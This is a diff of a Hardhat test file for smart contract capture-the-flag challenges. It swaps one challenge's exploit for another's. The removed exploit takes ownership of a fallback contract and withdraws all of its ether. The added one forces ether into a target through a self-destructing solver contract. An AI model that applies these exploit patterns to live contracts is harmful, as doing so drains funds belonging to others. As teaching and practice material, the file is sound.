@@ -1,7 +1,7 @@
 const { ethers } = require('hardhat');
 const { expect } = require('chai');
 
-describe('[Challenge] Example Vuln', function () {
+describe('[Challenge] Force', function () {
 
     let deployer, attacker;
     
@@ -13,34 +13,30 @@ describe('[Challenge] Example Vuln', function () {
         if (chainID == 5){ // goerli testnet
             /** connect to Dapp in goerli **/
             [attacker] = await ethers.getSigners();
-            const ContractFactory = await ethers.getContractFactory('ExampleFallback');
+            const ContractFactory = await ethers.getContractFactory('Force');
             this.target = ContractFactory.attach("");
             
         } else { // local network - hardhat  
             /** local test **/
             [deployer, attacker] = await ethers.getSigners();
-            const ContractFactory = await ethers.getContractFactory('ExampleFallback', deployer);
+            const ContractFactory = await ethers.getContractFactory('Force', deployer);
             this.target = await ContractFactory.deploy();
         }
     });
 
     it('Exploit', async () => {
         /** CODE YOUR EXPLOIT HERE */
-        const some_ether = ethers.utils.parseEther('0.0001', 'ether');
-        // Contribute to get into whitelist
-        await this.target.connect(attacker).contribute({value: some_ether});
-        // Takeover the contract's owner by sending some ethers
-        tx = {
-            to: this.target.address,
-            value: some_ether
-        };
-        await attacker.sendTransaction(tx);
-        // Withdraw all ethers in the contract
-        await this.target.connect(attacker).withdraw();
+        const ForceSolverFactory = await ethers.getContractFactory('ForceSolver', attacker);
+        console.log(`\t deploying solver contract...`);
+        const ForceSolver = await ForceSolverFactory.deploy();
+        console.log(`\t sending 1 wei to solver contract...`);
+        let sendTX = await attacker.sendTransaction({to:ForceSolver.address,value:1}); await sendTX.wait(); // Send 1 wei to the solver
+        console.log(`\t attacking target by self-destruct...`);
+        let attaclTX = await ForceSolver.connect(attacker).attack(this.target.address); await attaclTX.wait();
     }).timeout(0);
 
     after(async () => {
         /** SUCCESS CONDITIONS */
-        expect(await this.target.owner()).to.be.eq(attacker.address);
+        expect(parseInt(await ethers.provider.getBalance(this.target.address))).to.be.gt(0);
     });
 });
